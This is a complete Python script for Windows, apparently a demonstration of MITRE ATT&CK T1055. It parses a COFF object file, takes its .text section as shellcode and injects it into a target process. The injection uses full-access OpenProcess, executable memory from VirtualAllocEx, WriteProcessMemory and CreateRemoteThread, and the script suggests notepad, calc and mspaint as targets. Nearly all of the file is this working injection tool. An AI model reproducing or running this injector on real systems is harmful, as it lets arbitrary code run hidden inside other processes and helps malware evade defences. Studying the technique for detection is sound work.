import struct
import ctypes
from ctypes import wintypes
import sys
import os

class COFF_HEADER(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('Machine', wintypes.WORD),
        ('NumberOfSections', wintypes.WORD),
        ('TimeDateStamp', wintypes.DWORD),
        ('PointerToSymbolTable', wintypes.DWORD),
        ('NumberOfSymbols', wintypes.DWORD),
        ('SizeOfOptionalHeader', wintypes.WORD),
        ('Characteristics', wintypes.WORD)
    ]

class COFF_SECTION_HEADER(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('Name', ctypes.c_char * 8),
        ('VirtualSize', wintypes.DWORD),
        ('VirtualAddress', wintypes.DWORD),
        ('SizeOfRawData', wintypes.DWORD),
        ('PointerToRawData', wintypes.DWORD),
        ('PointerToRelocations', wintypes.DWORD),
        ('PointerToLinenumbers', wintypes.DWORD),
        ('NumberOfRelocations', wintypes.WORD),
        ('NumberOfLinenumbers', wintypes.WORD),
        ('Characteristics', wintypes.DWORD)
    ]

class COFFParser:
    def __init__(self, filename):
        self.filename = filename
        self.header = None
        self.sections = []
        self.raw_data = None
        
    def parse(self):
        try:
            if not os.path.exists(self.filename):
                raise FileNotFoundError(f"COFF file not found: {self.filename}")
                
            with open(self.filename, 'rb') as f:
                self.raw_data = f.read()
            
            header_size = ctypes.sizeof(COFF_HEADER)
            if len(self.raw_data) < header_size:
                raise ValueError("File too small to be a COFF file")
                
            self.header = COFF_HEADER.from_buffer_copy(self.raw_data[:header_size])
            
            section_start = header_size
            for i in range(self.header.NumberOfSections):
                section_offset = section_start + i * ctypes.sizeof(COFF_SECTION_HEADER)
                if section_offset + ctypes.sizeof(COFF_SECTION_HEADER) > len(self.raw_data):
                    raise ValueError("Section header exceeds file bounds")
                    
                section = COFF_SECTION_HEADER.from_buffer_copy(
                    self.raw_data[section_offset:section_offset + ctypes.sizeof(COFF_SECTION_HEADER)]
                )
                self.sections.append(section)
                
            return True
            
        except Exception as e:
            print(f"❌ Error parsing COFF file: {e}")
            return False
    
    def extract_section_data(self, section_name):
        for section in self.sections:
            name = section.Name.decode('utf-8', errors='ignore').strip('\x00')
            if name == section_name:
                start = section.PointerToRawData
                end = start + section.SizeOfRawData
                
                if start >= len(self.raw_data) or end > len(self.raw_data):
                    print(f"❌ Section {section_name} exceeds file bounds")
                    return None
                    
                return self.raw_data[start:end]
        return None
    
    def print_info(self):
        if not self.header:
            print("No header parsed")
            return
            
        print("COFF File Information:")
        print(f"  Machine: 0x{self.header.Machine:04X}")
        arch = "x86" if self.header.Machine == 0x014C else "Unknown"
        print(f"  Architecture: {arch}")
        print(f"  Number of Sections: {self.header.NumberOfSections}")
        print(f"  Characteristics: 0x{self.header.Characteristics:04X}")
        
        print("\nSections:")
        for i, section in enumerate(self.sections):
            name = section.Name.decode('utf-8', errors='ignore').strip('\x00')
            print(f"  [{i}] {name:8} Size: {section.SizeOfRawData:6} bytes")

class ProcessInjector:
    def __init__(self):
        self.kernel32 = ctypes.windll.kernel32
        
    def is_process_32bit(self, pid):
        """Check if target process is 32-bit"""
        try:
            PROCESS_QUERY_INFORMATION = 0x0400
            process_handle = self.kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
            if not process_handle:
                return None
                
            is_wow64 = ctypes.c_int()
            success = self.kernel32.IsWow64Process(process_handle, ctypes.byref(is_wow64))
            self.kernel32.CloseHandle(process_handle)
            
            return bool(is_wow64.value) if success else None
        except:
            return None
        
    def diagnose_injection_error(self, error_code, pid, shellcode_size):
        """Provide detailed error analysis"""
        print(f"\n=== INJECTION FAILURE ANALYSIS ===")
        print(f"Error Code: {error_code}")
        print(f"Target PID: {pid}")
        print(f"Shellcode Size: {shellcode_size} bytes")
        
        error_messages = {
            5: "ERROR_ACCESS_DENIED - Invalid shellcode or process protection",
            6: "ERROR_INVALID_HANDLE - Process handle invalid",
            8: "ERROR_NOT_ENOUGH_MEMORY - Memory allocation failed",
            87: "ERROR_INVALID_PARAMETER - Invalid parameters",
            299: "ERROR_PARTIAL_COPY - Partial memory write"
        }
        
        print(f"Diagnosis: {error_messages.get(error_code, 'Unknown error')}")
        print("====================================\n")
        
    def inject_shellcode(self, pid, shellcode):
        try:
            print(f"[1/4] Opening process PID: {pid}... ", end='')
            PROCESS_ALL_ACCESS = 0x1F0FFF
            process_handle = self.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
            if not process_handle:
                error = ctypes.GetLastError()
                print(f"FAILED (Error: {error})")
                self.diagnose_injection_error(error, pid, len(shellcode))
                return False
            print("SUCCESS")
            
            print(f"[2/4] Allocating memory ({len(shellcode)} bytes)... ", end='')
            MEM_COMMIT = 0x00001000
            MEM_RESERVE = 0x00002000
            PAGE_EXECUTE_READWRITE = 0x40
            
            remote_memory = self.kernel32.VirtualAllocEx(
                process_handle,
                None,
                len(shellcode),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            
            if not remote_memory:
                error = ctypes.GetLastError()
                print(f"FAILED (Error: {error})")
                self.kernel32.CloseHandle(process_handle)
                return False
            print(f"SUCCESS at 0x{remote_memory:X}")
            
            print(f"[3/4] Writing shellcode... ", end='')
            written = wintypes.SIZE_T()
            if not self.kernel32.WriteProcessMemory(
                process_handle,
                remote_memory,
                shellcode,
                len(shellcode),
                ctypes.byref(written)
            ):
                error = ctypes.GetLastError()
                print(f"FAILED (Error: {error}, Written: {written.value}/{len(shellcode)} bytes)")
                self.kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)  # MEM_RELEASE
                self.kernel32.CloseHandle(process_handle)
                return False
            print(f"SUCCESS ({written.value}/{len(shellcode)} bytes)")
            
            print(f"[4/4] Creating remote thread... ", end='')
            thread_id = wintypes.DWORD()
            thread_handle = self.kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                remote_memory,
                None,
                0,
                ctypes.byref(thread_id)
            )
            
            if not thread_handle:
                error = ctypes.GetLastError()
                print(f"FAILED (Error: {error})")
                self.diagnose_injection_error(error, pid, len(shellcode))
                self.kernel32.VirtualFreeEx(process_handle, remote_memory, 0, 0x8000)
                self.kernel32.CloseHandle(process_handle)
                return False
            
            print(f"SUCCESS (Thread ID: {thread_id.value})")
            
            # Wait for thread completion
            print("Waiting for thread completion... ", end='')
            self.kernel32.WaitForSingleObject(thread_handle, 5000)  # 5 second timeout
            
            # Get exit code
            exit_code = wintypes.DWORD()
            if self.kernel32.GetExitCodeThread(thread_handle, ctypes.byref(exit_code)):
                print(f"Thread exited with code: 0x{exit_code.value:08X}")
            else:
                print("Thread still running or exit code unavailable")
            
            self.kernel32.CloseHandle(thread_handle)
            self.kernel32.CloseHandle(process_handle)
            
            return True
            
        except Exception as e:
            print(f"FAILED: {e}")
            return False

def list_processes():
    """List available processes for testing"""
    try:
        from ctypes import byref, POINTER, Structure
        from ctypes.wintypes import DWORD, MAX_PATH
        
        class PROCESSENTRY32(Structure):
            _fields_ = [
                ('dwSize', DWORD),
                ('cntUsage', DWORD),
                ('th32ProcessID', DWORD),
                ('th32DefaultHeapID', DWORD),
                ('th32ModuleID', DWORD),
                ('cntThreads', DWORD),
                ('th32ParentProcessID', DWORD),
                ('pcPriClassBase', DWORD),
                ('dwFlags', DWORD),
                ('szExeFile', ctypes.c_char * MAX_PATH)
            ]
        
        kernel32 = ctypes.windll.kernel32
        TH32CS_SNAPPROCESS = 0x00000002
        
        snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
        if snapshot == -1:
            return
            
        entry = PROCESSENTRY32()
        entry.dwSize = ctypes.sizeof(PROCESSENTRY32)
        
        print("\n=== AVAILABLE PROCESSES ===")
        if kernel32.Process32First(snapshot, byref(entry)):
            count = 0
            while count < 15:  # Show first 15 processes
                name = entry.szExeFile.decode('utf-8', errors='ignore')
                print(f"  {entry.th32ProcessID:6} - {name}")
                count += 1
                if not kernel32.Process32Next(snapshot, byref(entry)):
                    break
                    
        kernel32.CloseHandle(snapshot)
        print("===========================\n")
        
    except Exception as e:
        print(f"Could not list processes: {e}")

def main():
    print("=== COFF Parser Enhanced - MITRE ATT&CK T1055 ===\n")
    
    if len(sys.argv) != 3:
        print("Usage: python coff_parser_enhanced.py <coff_file> <target_pid>")
        print("Example: python coff_parser_enhanced.py minimal_shellcode.obj 1234\n")
        
        list_processes()
        print("Recommended test targets:")
        print("  - notepad.exe (32-bit)")
        print("  - calc.exe (32-bit)") 
        print("  - mspaint.exe (32-bit)")
        return
    
    coff_file = sys.argv[1]
    target_pid = int(sys.argv[2])
    
    print(f"Target PID: {target_pid}")
    
    # Check process architecture
    injector = ProcessInjector()
    is_32bit = injector.is_process_32bit(target_pid)
    if is_32bit is None:
        print("⚠️  Cannot determine process architecture - proceeding with caution")
    elif not is_32bit:
        print("❌ Target process appears to be 64-bit - this tool supports 32-bit only")
        return
    
    print(f"\n[1/3] Parsing COFF file: {coff_file}")
    parser = COFFParser(coff_file)
    if not parser.parse():
        return
    
    parser.print_info()
    
    print(f"\n[2/3] Extracting shellcode from .text section")
    shellcode = parser.extract_section_data('.text')
    if not shellcode:
        print("❌ No .text section found or extraction failed")
        return
    
    print(f"Extracted {len(shellcode)} bytes of shellcode from .text section")
    
    print(f"\n[3/3] Attempting process injection")
    if injector.inject_shellcode(target_pid, shellcode):
        print("\n✅ SUCCESS: Process injection completed!")
        print("MITRE ATT&CK T1055 demonstrated successfully!")
    else:
        print("\n❌ FAILED: Process injection failed")

if __name__ == "__main__":
    main()